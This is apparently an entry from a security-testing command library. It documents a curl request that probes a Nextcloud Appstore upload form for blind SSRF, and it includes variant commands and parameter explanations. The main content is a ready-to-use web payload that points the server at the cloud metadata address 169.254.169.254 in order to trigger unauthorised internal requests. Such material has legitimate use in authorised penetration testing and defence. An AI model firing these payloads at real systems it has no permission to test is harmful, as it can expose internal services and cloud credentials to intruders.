---
id: cmd-curl-ssrf-upload
data: >-
  curl -X POST 'https://target-nextcloud.com/index.php/apps/appstore/upload' -F
  'release_url=http://169.254.169.254/latest/meta-data/' -F 'app_name=test-app'
  -F 'version=1.0' --verbose
tags:
  - ssrf
  - web
  - testing
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2025-01-15T00:00:00Z'
updated_at: '2025-12-14T03:47:17.985Z'
verified: false
validated: true
submitted: true
---
# curl-ssrf-upload-test

## Command

```bash
curl -X POST 'https://target-nextcloud.com/index.php/apps/appstore/upload' -F 'release_url=http://169.254.169.254/latest/meta-data/' -F 'app_name=test-app' -F 'version=1.0' --verbose
```

## Description

This curl command tests for blind SSRF in the Nextcloud Appstore upload form by submitting a multipart form with a malicious internal URL, triggering unauthorized server-side requests. Use it to probe for improper access control in web forms.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method for form submission | Yes |
| `-F 'release_url=...'` | Form field for the malicious URL payload | Yes |
| `-F 'app_name=...'` | Additional form field to mimic legitimate upload | Yes |
| `-F 'version=...'` | Version field for app release | No |
| `--verbose` | Enables detailed output for debugging | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/upload' -F 'url=http://internal/' --verbose
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/upload' -F 'release_url=http://169.254.169.254/' -F 'timeout=10' --max-time 30 --verbose
```

## Expected Output

HTTP response from the server (e.g., 200 OK with form processing message), verbose logs showing request details. For blind SSRF, look for indirect signs like increased latency (e.g., >5s delay) when targeting internal resources.

## Related

- [[Related Procedure|procedures/Exploit-Blind-SSRF-in-Nextcloud-Upload-Form]]
